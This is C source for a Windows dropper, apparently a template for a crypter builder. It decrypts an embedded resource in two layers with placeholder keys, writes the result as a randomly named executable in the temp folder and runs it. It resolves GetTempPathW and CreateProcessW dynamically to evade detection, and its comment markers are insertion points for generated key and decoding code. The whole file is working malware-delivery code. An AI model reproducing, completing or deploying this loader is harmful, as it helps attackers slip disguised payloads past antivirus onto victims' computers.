#define UNICODE
#include <windows.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <wincrypt.h>
#define IDR_EXE1 101
/*
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! dont remove comments they are used for inserting code 
*/ 

//define key1
//define key2

bool GetResourceBuffer(HMODULE hModule, int resId, BYTE** ppOut, DWORD* pOutSize) { //Loads data 
    //resource from the program’s embedded resources, decodes it into raw bytes, and returns a heap-allocated buffer containing the decoded data.
    if (!ppOut || !pOutSize) return false;
    *ppOut = NULL;
    *pOutSize = 0;

    HRSRC hRes = FindResourceW(hModule, MAKEINTRESOURCE(resId), RT_RCDATA);
    if (!hRes) return false;

    HGLOBAL hGlob = LoadResource(hModule, hRes);
    if (!hGlob) return false;

    DWORD resSize = SizeofResource(hModule, hRes);
    if (resSize == 0) return false;

    const BYTE* pResData = (const BYTE*)LockResource(hGlob);
    if (!pResData) return false;

    BYTE* buffer = (BYTE*)malloc(resSize);
    if (!buffer) return false;

    memcpy(buffer, pResData, resSize);

    *ppOut = buffer;
    *pOutSize = resSize;
    return true;
}

//base641

//decodescript1

//decodescript2

FARPROC ResolveAPIW(LPCWSTR moduleName, LPCSTR procName) {
    HMODULE hMod = GetModuleHandleW(moduleName);
    if (!hMod) hMod = LoadLibraryW(moduleName);
    if (!hMod) return NULL;
    return GetProcAddress(hMod, procName);
}
void DropAndRun(HMODULE hModule) {
    WCHAR tempPath[MAX_PATH] = {0};
    WCHAR fullPath[MAX_PATH] = {0};

    typedef DWORD (WINAPI* GetTempPathW_t)(DWORD, LPWSTR);
    GetTempPathW_t pGetTempPathW = (GetTempPathW_t)ResolveAPIW(L"kernel32.dll", "GetTempPathW");
    if (!pGetTempPathW) return;
    DWORD tpLen = pGetTempPathW(MAX_PATH, tempPath);
    if (tpLen == 0 || tpLen > MAX_PATH) return;

    srand((unsigned int)time(NULL) ^ (unsigned int)GetCurrentProcessId());
    WCHAR fileName[32] = {0};
    if (swprintf(fileName, _countof(fileName), L"D%04u.exe", rand() % 10000) < 0) return;

    if (wcslen(tempPath) + wcslen(fileName) + 1 >= _countof(fullPath)) return;
    wcscpy(fullPath, tempPath);
    wcscat(fullPath, fileName);

    // 1) Load raw resource bytes
    BYTE* decodedData = NULL;
    DWORD decodedSize = 0;
    if (!GetResourceBuffer(hModule, IDR_EXE1, &decodedData, &decodedSize)) {
        return;
    }


    //base642

    
    decrypt2(decodedData, decodedSize, KEY2);
    decrypt1(decodedData, decodedSize, KEY1);
    // After this call, decodedData contains the actual executable bytes.

    FILE* f = _wfopen(fullPath, L"wb");
    if (!f) {
        SecureZeroMemory(decodedData, decodedSize);
        free(decodedData);
        return;
    }

    size_t written = fwrite(decodedData, 1, decodedSize, f);
    fflush(f);
    fclose(f);

    if (written != decodedSize) {
        DeleteFileW(fullPath);
        SecureZeroMemory(decodedData, decodedSize);
        free(decodedData);
        return;
    }
    SecureZeroMemory(decodedData, decodedSize);
    free(decodedData);
    decodedData = NULL;

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    typedef BOOL (WINAPI* CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                           BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

    CreateProcessW_t pCreateProcessW = (CreateProcessW_t)ResolveAPIW(L"kernel32.dll", "CreateProcessW");
    if (pCreateProcessW) {
        BOOL ok = pCreateProcessW(fullPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (ok) {
            if (pi.hProcess) CloseHandle(pi.hProcess);
            if (pi.hThread)  CloseHandle(pi.hThread);
        } else {
        }
    }
    }
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR lpCmdLine, int nCmdShow) {
    HMODULE hModule = GetModuleHandleA(NULL);
    DropAndRun(hModule);
    return 0;

}